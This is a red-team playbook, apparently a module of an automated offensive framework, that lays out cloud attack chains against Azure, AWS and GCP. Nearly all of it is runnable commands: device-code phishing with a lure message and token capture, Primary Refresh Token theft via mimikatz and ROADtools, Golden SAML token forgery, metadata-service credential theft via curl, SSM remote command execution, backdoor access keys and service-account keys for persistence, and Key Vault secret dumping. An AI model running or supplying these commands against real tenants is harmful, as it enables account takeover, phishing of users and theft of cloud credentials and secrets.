# RT10: Cloud APT - Azure/AWS/GCP Advanced Techniques

**MITRE:** T1528, T1550.004, T1606.002, T1098.001 | **When:** Cloud tenant confirmed + initial foothold obtained.

## Azure Device Code Phishing (T1528) - No MFA bypass needed

```bash
# Step 1: Get device code from Microsoft:
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=https://graph.microsoft.com/.default openid profile"
# ^ d3590ed6... = Microsoft Office client_id (pre-registered, widely trusted)

# Step 2: Send user_code to victim in phishing email:
# "Please sign in at https://microsoft.com/devicelogin and enter code: XXXXX-XXXXX"
# Victim enters code, authenticates, grants your device full access

# Step 3: Poll for token:
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&device_code=<device_code>"
# Returns: access_token + refresh_token (refresh survives password change if not revoked)

# Tool: TokenTactics, ROADtools, AADInternals
# TokenTactics:
Import-Module TokenTactics
Get-AzureToken -Client MSTeams  # gets token for Teams, OneDrive, etc.
```

## Pass-the-PRT (Primary Refresh Token) - T1550.004

```powershell
# PRT = long-lived SSO token on Azure AD-joined/hybrid-joined Windows devices
# Allows generating any Azure AD token without password/MFA

# Extract PRT (requires admin on target):
# Tool: ROADtoken, AADInternals
Invoke-AADIntDeviceTransportKeyRetrieval  # requires SYSTEM
# OR via Chrome cookies + BrowserCache (PRT baked into browser auth)

# Use PRT to get access token (mimikatz):
# mimikatz: sekurlsa::cloudap
# OR: ROADtools: roadtx.exe gettokens --prt <PRT> --prt-sessionkey <key>

# Generate cookie from PRT (works on Entra ID portal):
roadtx.exe interactiveauth --device-code  # or
roadtx.exe gettokens --prt-cookie <nonce_signed_cookie>
```

## ADFS Golden SAML (T1606.002)

```powershell
# Requires: Dump ADFS private key (SYSTEM on ADFS server or AD backup)
# Golden SAML = forge SAML assertions for ANY user in federated domain (incl. MFA bypass)

# Step 1: Export AD FS token signing cert (requires ADFS server admin):
# Via AADInternals:
Export-AADIntADFSSigningCertificate -filename adfs.pfx

# Step 2: Create Golden SAML assertion:
New-AADIntSAMLToken -ImmutableID "YXMxMjM0..." -Issuer "http://adfs.corp.local/adfs/services/trust" -PfxFileName adfs.pfx -PfxPassword "export_pass"

# Step 3: Use token to authenticate to Azure AD / O365 / any SP:
# Open-AADIntOffice365Portal -SAMLToken $token
```

## AWS Assumed-Role Lateral Movement

```bash
# Step 1: Get initial creds (from SSRF/IMDS, stolen env vars, code, S3):
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...   # if STS temp creds

# Step 2: Enumerate assumable roles:
aws sts get-caller-identity
aws iam list-roles --query "Roles[*].[RoleName,Arn]"
# Find roles with sts:AssumeRole trust relationships pointing to your account/user

# Step 3: Assume role for privilege escalation:
aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/AdminRole --role-session-name pentest
export AWS_ACCESS_KEY_ID=<new_key>
export AWS_SECRET_ACCESS_KEY=<new_secret>
export AWS_SESSION_TOKEN=<new_token>

# Step 4: Enumerate privileges:
pacu  # AWS exploitation framework
# OR:
aws iam list-attached-role-policies --role-name <ROLE>
aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,PrivateIpAddress,Tags]"

# Step 5: EC2 lateral via SSM (no SSH needed):
aws ssm start-session --target i-<INSTANCE_ID>
aws ssm send-command --instance-ids i-<ID> --document-name "AWS-RunShellScript" --parameters commands='["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'

# Persistence: create backdoor access key:
aws iam create-access-key --user-name <existing_user>
```

## GCP Service Account Abuse

```bash
# Step 1: Find service account key files or metadata creds:
# IMDS on GCP:
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Step 2: Enumerate permissions:
gcloud auth activate-service-account --key-file sa.json
gcloud projects get-iam-policy <PROJECT_ID>
gcloud iam service-accounts list --project <PROJECT_ID>

# Step 3: Create new SA key (persistence):
gcloud iam service-accounts keys create backdoor.json --iam-account <SA_EMAIL>

# Step 4: Impersonate higher-priv SA (if iam.serviceAccounts.actAs):
gcloud --impersonate-service-account=<ADMIN_SA_EMAIL> projects list

# Tool: GCPBucketBrute, GCPTokenReuse, WeirdAAL (GCP)
```

## Azure Post-Compromise Enum

```bash
# After getting token (via device code phish / PRT):
az login --use-device-code
az account list  # all subscriptions
az ad user list --query "[*].[displayName,userPrincipalName]" -o table
az ad group member list -g "GlobalAdministrators"
az keyvault list  # find keyvaults
az keyvault secret list --vault-name <VAULT>
az keyvault secret show --vault-name <VAULT> --name <SECRET>  # read secret

# Enumerate PIM eligible roles (may be activatable):
# Via Graph API:
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances"
```

**Signal:** `emit_signal VULN_CONFIRMED "Cloud APT chain confirmed: <technique> on <tenant/account>" "main/redteam" 0.93`
